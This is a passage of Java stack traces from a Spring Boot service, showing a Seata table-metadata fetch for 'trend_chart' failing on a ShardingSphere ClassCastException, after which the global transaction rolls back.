sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:344) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:198) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:366) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:99) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:212) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.sun.proxy.$proxy168.insert(unknown source) ~[na:na] at com.qianxian.module.service.controller.modulecontroller.hello(modulecontroller.java:35) ~[classes/:na] at com.qianxian.module.service.controller.modulecontroller$$fastclassbyspringcglib$$5ff8ab5d.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:769) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:109) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:104) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:106) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:83) ~[seata-all-1.2.0.jar:1.2.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.qianxian.module.service.controller.modulecontroller$$enhancerbyspringcglib$$c73e434c.hello(<generated>) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:106) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:888) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:793) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1040) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:943) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1006) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:898) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:883) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at com.qianxian.module.service.filter.securityfilter.dofilter(securityfilter.java:60) ~[classes/:na] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:100) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:93) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:201) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:526) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:861) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1579) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) ~[na:1.8.0_251] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) ~[na:1.8.0_251] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at java.lang.thread.run(thread.java:748) ~[na:1.8.0_251]
caused by: java.lang.classcastexception: java.lang.string cannot be cast to java.lang.integer at org.apache.shardingsphere.shardingjdbc.jdbc.core.resultset.databasemetadataresultset.getint(databasemetadataresultset.java:190) ~[sharding-jdbc-core-4.1.1.jar:4.1.1] at org.apache.shardingsphere.shardingjdbc.jdbc.core.resultset.databasemetadataresultset.getint(databasemetadataresultset.java:195) ~[sharding-jdbc-core-4.1.1.jar:4.1.1] at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.resultsetmetatoschema(postgresqltablemetacache.java:140) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.fetchschema(postgresqltablemetacache.java:72) ~[seata-all-1.2.0.jar:1.2.0] ..
115 common frames omitted 2020-06-17 16:20:29.464 error 15280 --- [nio-2566-exec-1] i.s.r.d.s.s.c.abstracttablemetacache : get table meta error:failed to fetch schema of trend_chart java.sql.sqlexception: failed to fetch schema of trend_chart at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.fetchschema(postgresqltablemetacache.java:77) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.sql.struct.cache.abstracttablemetacache.gettablemeta(abstracttablemetacache.java:70) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.abstractconnectionproxy.preparestatement(abstractconnectionproxy.java:117) [seata-all-1.2.0.jar:1.2.0] at org.apache.ibatis.executor.statement.preparedstatementhandler.instantiatestatement(preparedstatementhandler.java:86) [mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.basestatementhandler.prepare(basestatementhandler.java:88) [mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.routingstatementhandler.prepare(routingstatementhandler.java:59) [mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.apache.ibatis.plugin.invocation.proceed(invocation.java:49) [mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.extension.plugins.paginationinterceptor.intercept(paginationinterceptor.java:174) [mybatis-plus-extension-3.3.2.jar:3.3.2] at org.apache.ibatis.plugin.plugin.invoke(plugin.java:61) [mybatis-3.5.4.jar:3.5.4] at com.sun.proxy.$proxy222.prepare(unknown source) [na:na] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.preparestatement(mybatissimpleexecutor.java:92) [mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.doupdate(mybatissimpleexecutor.java:53) [mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) [mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.core.executor.mybatiscachingexecutor.update(mybatiscachingexecutor.java:83) [mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) [mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:184) [mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:426) [mybatis-spring-2.0.4.jar:2.0.4] at com.sun.proxy.$proxy131.insert(unknown source) [na:na] at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:271) [mybatis-spring-2.0.4.jar:2.0.4] at com.baomidou.mybatisplus.core.override.mybatismappermethod.execute(mybatismappermethod.java:60) [mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.override.mybatismapperproxy.invoke(mybatismapperproxy.java:96) [mybatis-plus-core-3.3.2.jar:3.3.2] at com.sun.proxy.$proxy167.insert(unknown source) [na:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:344) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:198) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:366) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:99) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:212) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.sun.proxy.$proxy168.insert(unknown source) ~[na:na] at com.qianxian.module.service.controller.modulecontroller.hello(modulecontroller.java:35) ~[classes/:na] at com.qianxian.module.service.controller.modulecontroller$$fastclassbyspringcglib$$5ff8ab5d.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:769) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:109) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:104) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:106) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:83) ~[seata-all-1.2.0.jar:1.2.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) [spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.qianxian.module.service.controller.modulecontroller$$enhancerbyspringcglib$$c73e434c.hello(<generated>) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:106) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:888) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:793) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1040) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:943) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1006) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:898) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:883) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at com.qianxian.module.service.filter.securityfilter.dofilter(securityfilter.java:60) ~[classes/:na] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:100) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:93) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:201) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:526) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:861) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1579) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) ~[na:1.8.0_251] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) ~[na:1.8.0_251] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at java.lang.thread.run(thread.java:748) ~[na:1.8.0_251]
caused by: java.lang.classcastexception: java.lang.string cannot be cast to java.lang.integer at org.apache.shardingsphere.shardingjdbc.jdbc.core.resultset.databasemetadataresultset.getint(databasemetadataresultset.java:190) ~[sharding-jdbc-core-4.1.1.jar:4.1.1] at org.apache.shardingsphere.shardingjdbc.jdbc.core.resultset.databasemetadataresultset.getint(databasemetadataresultset.java:195) ~[sharding-jdbc-core-4.1.1.jar:4.1.1] at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.resultsetmetatoschema(postgresqltablemetacache.java:140) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.fetchschema(postgresqltablemetacache.java:72) ~[seata-all-1.2.0.jar:1.2.0] ..
108 common frames omitted 2020-06-17 16:20:29.479 info 15280 --- [nio-2566-exec-1] i.seata.tm.api.defaultglobaltransaction : [192.168.101.24:8091:2014451224] rollback status: rollbacked
2020-06-17 16:20:29.490 error 15280 --- [nio-2566-exec-1] o.a.c.c.c.[.[.[/].[dispatcherservlet] : servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception [request processing failed; nested exception is org.mybatis.spring.mybatissystemexception: nested exception is org.apache.ibatis.executor.executorexception: error preparing statement
cause: io.seata.common.exception.shouldneverhappenexception: [xid:192.168.101.24:8091:2014451224]get tablemeta failed] with root cause io.seata.common.exception.shouldneverhappenexception: [xid:192.168.101.24:8091:2014451224]get tablemeta failed at io.seata.rm.datasource.sql.struct.cache.abstracttablemetacache.gettablemeta(abstracttablemetacache.java:77) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.abstractconnectionproxy.preparestatement(abstractconnectionproxy.java:117) ~[seata-all-1.2.0.jar:1.2.0] at org.apache.ibatis.executor.statement.preparedstatementhandler.instantiatestatement(preparedstatementhandler.java:86) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.basestatementhandler.prepare(basestatementhandler.java:88) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.routingstatementhandler.prepare(routingstatementhandler.java:59) ~[mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.apache.ibatis.plugin.invocation.proceed(invocation.java:49) ~[mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.extension.plugins.paginationinterceptor.intercept(paginationinterceptor.java:174) ~[mybatis-plus-extension-3.3.2.jar:3.3.2] at org.apache.ibatis.plugin.plugin.invoke(plugin.java:61) ~[mybatis-3.5.4.jar:3.5.4] at com.sun.proxy.$proxy222.prepare(unknown source) ~[na:na] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.preparestatement(mybatissimpleexecutor.java:92) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.doupdate(mybatissimpleexecutor.java:53) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) ~[mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.core.executor.mybatiscachingexecutor.update(mybatiscachingexecutor.java:83) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:184) ~[mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:426) ~[mybatis-spring-2.0.4.jar:2.0.4] at com.sun.proxy.$proxy131.insert(unknown source) ~[na:na] at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:271) ~[mybatis-spring-2.0.4.jar:2.0.4] at com.baomidou.mybatisplus.core.override.mybatismappermethod.execute(mybatismappermethod.java:60) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.override.mybatismapperproxy.invoke(mybatismapperproxy.java:96) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.sun.proxy.$proxy167.insert(unknown source) ~[na:na] at 